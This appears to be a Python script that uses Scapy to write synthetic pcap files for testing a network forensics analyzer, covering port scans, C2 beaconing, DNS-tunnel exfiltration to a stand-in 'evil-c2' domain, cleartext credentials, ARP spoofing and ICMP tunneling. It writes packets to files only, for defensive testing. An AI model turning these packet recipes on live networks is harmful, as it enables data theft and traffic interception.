#!/usr/bin/env python3
"""
generate_samples.py — Sample PCAP Generator
────────────────────────────────────────────
Creates realistic .pcap files for testing the network forensics analyzer.

Generates:
  samples/recon.pcap          — SYN sweep reconnaissance
  samples/c2_beacon.pcap      — Regular C2 beaconing
  samples/dns_tunnel.pcap     — DNS tunneling exfiltration
  samples/cleartext_creds.pcap— HTTP form + FTP cleartext credentials
  samples/mixed_attacks.pcap  — All attack types combined
"""

import os, sys, random, time, base64

try:
    from scapy.all import Ether, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, wrpcap
except ImportError:
    print("[!] Scapy not installed. Run: pip3 install scapy")
    sys.exit(1)

OUT = os.path.join(os.path.dirname(__file__), '..', 'samples')
os.makedirs(OUT, exist_ok=True)

ATTACKER   = "45.33.32.156"
VICTIM     = "192.168.1.100"
VICTIM2    = "192.168.1.101"
GATEWAY    = "192.168.1.1"
C2_SERVER  = "203.0.113.50"
DNS_SERVER = "8.8.8.8"
WEB_SERVER = "192.168.1.50"
FTP_SERVER = "192.168.1.51"

BASE_TIME = time.time() - 3600

def ts(offset=0):
    return BASE_TIME + offset

def make_syn(src, dst, dport, t, sport=None):
    sport = sport or random.randint(40000,65000)
    pkt = (Ether()/IP(src=src, dst=dst, ttl=64)/
           TCP(sport=sport, dport=dport, flags="S", seq=random.randint(1000,99999)))
    pkt.time = t
    return pkt

def make_synack(src, dst, sport, dport, t):
    pkt = (Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="SA"))
    pkt.time = t
    return pkt

def make_data(src, dst, dport, payload, t, sport=None):
    sport = sport or random.randint(40000,65000)
    pkt = (Ether()/IP(src=src, dst=dst)/
           TCP(sport=sport, dport=dport, flags="PA")/payload)
    pkt.time = t
    return pkt

# ── 1. Network Reconnaissance ─────────────────────────────────────────────────
def gen_recon():
    print("  [1/5] Generating recon.pcap ...")
    pkts = []
    common_ports = [21,22,23,25,53,80,110,139,143,443,445,
                    1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]

    for i in range(20):
        pkts.append(make_syn(VICTIM, GATEWAY, 80, ts(i*10)))
        pkts.append(make_synack(GATEWAY, VICTIM, 80, random.randint(40000,65000), ts(i*10+0.1)))

    for i, port in enumerate(common_ports):
        pkts.append(make_syn(ATTACKER, VICTIM, port, ts(100 + i*0.5)))

    for port in [22, 80, 443]:
        pkts.append(make_synack(VICTIM, ATTACKER, port, random.randint(40000,65000), ts(115)))

    pkts.sort(key=lambda p: p.time)
    path = os.path.join(OUT, "recon.pcap")
    wrpcap(path, pkts)
    print(f"    ✓ {len(pkts)} packets → {path}")
    return path

# ── 2. C2 Beacon ─────────────────────────────────────────────────────────────
def gen_c2_beacon():
    print("  [2/5] Generating c2_beacon.pcap ...")
    pkts = []
    for i in range(20):
        t = ts(i * 30 + random.uniform(-0.3, 0.3))
        pkts.append(make_syn(VICTIM, C2_SERVER, 4444, t))
        pkts.append(make_synack(C2_SERVER, VICTIM, 4444, random.randint(40000,65000), t+0.05))
        pkts.append(make_data(C2_SERVER, VICTIM, 4444, b"X"*128, t+0.1))
        pkts.append(make_data(VICTIM, C2_SERVER, 4444, b"X"*64, t+0.2))

    for i in range(10):
        pkts.append(make_syn(VICTIM, "93.184.216.34", 80, ts(random.randint(0,600))))

    pkts.sort(key=lambda p: p.time)
    path = os.path.join(OUT, "c2_beacon.pcap")
    wrpcap(path, pkts)
    print(f"    ✓ {len(pkts)} packets → {path}")
    return path

# ── 3. DNS Tunneling ──────────────────────────────────────────────────────────
def gen_dns_tunnel():
    print("  [3/5] Generating dns_tunnel.pcap ...")
    pkts = []
    for i in range(10):
        q = DNSQR(qname="www.google.com", qtype="A")
        pkt = (Ether()/IP(src=VICTIM, dst=DNS_SERVER)/
               UDP(sport=random.randint(40000,65000), dport=53)/DNS(rd=1, qd=q))
        pkt.time = ts(i*5)
        pkts.append(pkt)

    secret_data = b"SECRETPASSWORD:admin@company.com creditcard:4111111111111111"
    chunks = [secret_data[i:i+30] for i in range(0, len(secret_data), 30)]
    for i, chunk in enumerate(chunks * 20):
        encoded = base64.b64encode(chunk).decode().replace("=","")
        tunnel_domain = f"{encoded}.exfil.evil-c2.com"
        q = DNSQR(qname=tunnel_domain, qtype="TXT")
        pkt = (Ether()/IP(src=VICTIM, dst=DNS_SERVER)/
               UDP(sport=random.randint(40000,65000), dport=53)/DNS(rd=1, qd=q))
        pkt.time = ts(100 + i*2)
        pkts.append(pkt)

    pkts.sort(key=lambda p: p.time)
    path = os.path.join(OUT, "dns_tunnel.pcap")
    wrpcap(path, pkts)
    print(f"    ✓ {len(pkts)} packets → {path}")
    return path

# ── 4. Cleartext Credentials ──────────────────────────────────────────────────
def gen_cleartext_creds():
    print("  [4/5] Generating cleartext_creds.pcap ...")
    pkts = []

    # Normal HTTPS-looking traffic (cover)
    for i in range(10):
        pkts.append(make_syn(VICTIM, WEB_SERVER, 443, ts(i*5)))

    # HTTP login form submitted in cleartext (port 80, no TLS)
    http_body = b"username=admin&password=SuperSecret123&remember=true"
    http_req = (b"POST /login HTTP/1.1\r\n"
                b"Host: internal-portal.local\r\n"
                b"Content-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: " + str(len(http_body)).encode() + b"\r\n\r\n" + http_body)
    pkts.append(make_syn(VICTIM, WEB_SERVER, 80, ts(50)))
    pkts.append(make_synack(WEB_SERVER, VICTIM, 80, 51000, ts(50.1)))
    pkts.append(make_data(VICTIM, WEB_SERVER, 80, http_req, ts(50.2), sport=51000))

    # HTTP Basic Auth header
    basic_auth = base64.b64encode(b"admin:Passw0rd!").decode()
    http_req2 = (b"GET /admin/dashboard HTTP/1.1\r\n"
                 b"Host: legacy-app.local\r\n"
                 b"Authorization: Basic " + basic_auth.encode() + b"\r\n\r\n")
    pkts.append(make_syn(VICTIM, WEB_SERVER, 80, ts(60)))
    pkts.append(make_data(VICTIM, WEB_SERVER, 80, http_req2, ts(60.2)))

    # FTP cleartext USER/PASS
    pkts.append(make_syn(VICTIM, FTP_SERVER, 21, ts(70)))
    pkts.append(make_synack(FTP_SERVER, VICTIM, 21, 52000, ts(70.1)))
    pkts.append(make_data(VICTIM, FTP_SERVER, 21, b"USER ftpadmin\r\n", ts(70.2), sport=52000))
    pkts.append(make_data(VICTIM, FTP_SERVER, 21, b"PASS LegacyFtp2024\r\n", ts(70.3), sport=52000))

    pkts.sort(key=lambda p: p.time)
    path = os.path.join(OUT, "cleartext_creds.pcap")
    wrpcap(path, pkts)
    print(f"    ✓ {len(pkts)} packets → {path}")
    return path

# ── 5. Mixed attacks ───────────────────────────────────────────────────────────
def gen_mixed():
    print("  [5/5] Generating mixed_attacks.pcap ...")
    pkts = []

    # Recon sweep
    ports = [22,80,443,3389,445,1433,3306,21,23,8080,8443,6379,27017,9001,1337]
    for i,p in enumerate(ports):
        pkts.append(make_syn(ATTACKER, VICTIM, p, ts(i*0.5)))

    # C2 beaconing
    for i in range(10):
        pkts.append(make_syn(VICTIM, C2_SERVER, 4444, ts(50 + i*30)))

    # Cleartext HTTP login
    http_body = b"username=svc_backup&password=Winter2024!"
    http_req = (b"POST /login HTTP/1.1\r\nHost: portal.local\r\n"
                b"Content-Length: " + str(len(http_body)).encode() + b"\r\n\r\n" + http_body)
    pkts.append(make_syn(VICTIM, WEB_SERVER, 80, ts(200)))
    pkts.append(make_data(VICTIM, WEB_SERVER, 80, http_req, ts(200.2)))

    # Large outbound transfer (exfiltration)
    for i in range(20):
        pkts.append(make_data(VICTIM, C2_SERVER, 443, b"X"*25000, ts(400 + i*0.1)))

    # ARP spoofing
    for mac in ["aa:bb:cc:dd:ee:ff", "11:22:33:44:55:66"]:
        pkt = (Ether(src=mac)/ARP(op=2, psrc=GATEWAY, pdst=VICTIM,
                                   hwsrc=mac, hwdst="ff:ff:ff:ff:ff:ff"))
        pkt.time = ts(500)
        pkts.append(pkt)

    # ICMP tunnel
    for i in range(8):
        payload = b"TUNNELED_DATA:" + b"A"*200
        pkt = (Ether()/IP(src=VICTIM, dst=C2_SERVER)/ICMP(type=8)/payload)
        pkt.time = ts(600 + i*2)
        pkts.append(pkt)

    # Weak TLS handshake (TLS 1.0 ClientHello marker)
    tls10_hello = b"\x16\x03\x01\x00\x2f" + b"\x01" * 42
    pkts.append(make_data(VICTIM, WEB_SERVER, 443, tls10_hello, ts(650)))

    # Normal traffic
    for i in range(30):
        pkts.append(make_syn(VICTIM, "8.8.8.8", 443, ts(random.randint(0,700))))

    pkts.sort(key=lambda p: p.time)
    path = os.path.join(OUT, "mixed_attacks.pcap")
    wrpcap(path, pkts)
    print(f"    ✓ {len(pkts)} packets → {path}")
    return path

def main():
    print(f"\n{'='*50}")
    print(f"  SAMPLE PCAP GENERATOR")
    print(f"{'='*50}\n")
    gen_recon()
    gen_c2_beacon()
    gen_dns_tunnel()
    gen_cleartext_creds()
    gen_mixed()
    print(f"\n  All samples in: samples/")
    print(f"\n  Test with:")
    print(f"    python3 src/analyzer.py samples/recon.pcap")
    print(f"    python3 src/analyzer.py samples/cleartext_creds.pcap --verbose")
    print(f"    python3 src/analyzer.py samples/mixed_attacks.pcap --verbose\n")

if __name__ == "__main__":
    main()
